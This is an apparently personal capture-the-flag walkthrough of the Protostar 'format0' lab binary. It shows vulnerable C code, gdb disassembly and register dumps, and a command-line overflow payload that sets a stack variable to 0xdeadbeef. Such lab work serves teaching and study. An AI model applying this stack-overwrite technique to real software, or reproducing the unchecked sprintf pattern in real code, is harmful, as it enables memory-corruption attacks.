Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Let's set a break point just before the compare cmp instruction.

```bash
user@protostar:/opt/protostar/bin$ gdb -q format0
Reading symbols from /opt/protostar/bin/format0...done.
(gdb) set disassembly-flavor intel
(gdb) 
(gdb) disassemble vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x68
0x080483fa <vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]               
0x08048416 <vuln+34>:   cmp    eax,0xdeadbeef                                
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>                           
0x0804841d <vuln+41>:   mov    DWORD PTR [esp],0x8048510                                 
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>                                      
0x08048429 <vuln+53>:   leave               
0x0804842a <vuln+54>:   ret                 
End of assembler dump.                      
(gdb) b * 0x08048413                        
Breakpoint 1 at 0x8048413: file format0/format0.c, line 15.                              
(gdb)                                       
```

Let's define a hook-stop

```bash
(gdb) define hook-stop                      
Type commands for definition of "hook-stop".                                             
End with a line saying just "end".                                                       
>info registers                             
>x/10x $esp                                 
>x/4i $eip                                  
>end                                        
(gdb) 
```

Great, now lets run the binary with 60 As + BBBB + CCCC + DDDD + EEEEE

```bash
(gdb) r $(python -c 'print("A"*60+"BBBBCCCCDDDDEEEE")')                                                                                                                           
Starting program: /opt/protostar/bin/format0 $(python -c 'print("A"*60+"BBBBCCCCDDDDEEEE")')                                                                                      
eax            0x4c     76                                                                                                                                                        
ecx            0x0      0                                                                                                                                                         
edx            0xbffff604       -1073744380                                                                                                                                       
ebx            0xb7fd7ff4       -1208123404                                                                                                                                       
esp            0xbffff6d0       0xbffff6d0                                                                                                                                        
ebp            0xbffff738       0xbffff738                                                                                                                                        
esi            0x0      0                                                                                                                                                         
edi            0x0      0                                                                                                                                                         
eip            0x8048413        0x8048413 <vuln+31>                                                                                                                               
eflags         0x200292 [ AF SF IF ID ]                                                                                                                                           
cs             0x73     115                                                                                                                                                       
ss             0x7b     123                                                                                                                                                       
ds             0x7b     123                                                                                                                                                       
es             0x7b     123                                                                                                                                                       
fs             0x0      0                                                                                                                                                         
gs             0x33     51                                                                                                                                                        
0xbffff6d0:     0xbffff6ec      0xbffff93c      0x080481e8      0xbffff768                                                                                                        
0xbffff6e0:     0xb7fffa54      0x00000000      0xb7fe1b28      0x41414141                                                                                                        
0xbffff6f0:     0x41414141      0x41414141                                               
0x8048413 <vuln+31>:    mov    eax,DWORD PTR [ebp-0xc]                                   
0x8048416 <vuln+34>:    cmp    eax,0xdeadbeef                                            
0x804841b <vuln+39>:    jne    0x8048429 <vuln+53>                                       
0x804841d <vuln+41>:    mov    DWORD PTR [esp],0x8048510                                 

Breakpoint 1, vuln (string=0xbffff93c 'A' <repeats 60 times>, "BBBBCCCCDDDDEEEE") at format0/format0.c:15                                                                         
15      format0/format0.c: No such file or directory.                                    
        in format0/format0.c                
(gdb)
```

Examining the next 2 instructions from eip, we should see the cmp instruction.
```bash
(gdb) x/2i $eip                                                                                                                                                           [35/653]
0x8048413 <vuln+31>:    mov    eax,DWORD PTR [ebp-0xc]                                                                                                                            
0x8048416 <vuln+34>:    cmp    eax,0xdeadbee
```

Okay it is there, single step forward now.

```bash
(gdb) si                                                                                                                                                                          
eax            0x43434343       1128481603                                                                                                                                        
ecx            0x0      0                                                                                                                                                         
edx            0xbffff604       -1073744380                                                                                                                                       
ebx            0xb7fd7ff4       -1208123404                                                                                                                                       
esp            0xbffff6d0       0xbffff6d0                                                                                                                                        
ebp            0xbffff738       0xbffff738                                                                                                                                        
esi            0x0      0                                                                                                                                                         
edi            0x0      0                                                                                                                                                         
eip            0x8048416        0x8048416 <vuln+34>                                                                                                                               
eflags         0x200292 [ AF SF IF ID ]                                                                                                                                           
cs             0x73     115                                                                                                                                                       
ss             0x7b     123                                                                                                                                                       
ds             0x7b     123                                                                                                                                                       
es             0x7b     123                                                                                                                                                       
fs             0x0      0                                                                                                                                                         
gs             0x33     51                                                                                                                                                        
0xbffff6d0:     0xbffff6ec      0xbffff93c      0x080481e8      0xbffff768                                                                                                        
0xbffff6e0:     0xb7fffa54      0x00000000      0xb7fe1b28      0x41414141                                                                                                        
0xbffff6f0:     0x41414141      0x41414141                                                                                                                                        
0x8048416 <vuln+34>:    cmp    eax,0xdeadbeef                                                                                                                                     
0x804841b <vuln+39>:    jne    0x8048429 <vuln+53>                                                                                                                                
0x804841d <vuln+41>:    mov    DWORD PTR [esp],0x8048510                                                                                                                          
0x8048424 <vuln+48>:    call   0x8048330 <puts@plt>                                                                                                                               
0x08048416      15      in format0/format0.c                                                                                                                                      
(gdb) 
```

We notice that the value of EAX is 43434343 (CCCC) and the value of eax is going to be compared with 0xdeadbeef , so inorder to pass the cmp check we will have to develop our payload like this:
"A" * 60 + "BBBB" + (0xdeadbeaf in little endian notation)

exploit:

```bash
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'import struct;print("A"*60+"BBBB"+struct.pack("I",0xdeadbeef))')
you have hit the target correctly :)
user@protostar:/opt/protostar/bin$ 
```

![[Pasted image 20210806210057.png]]

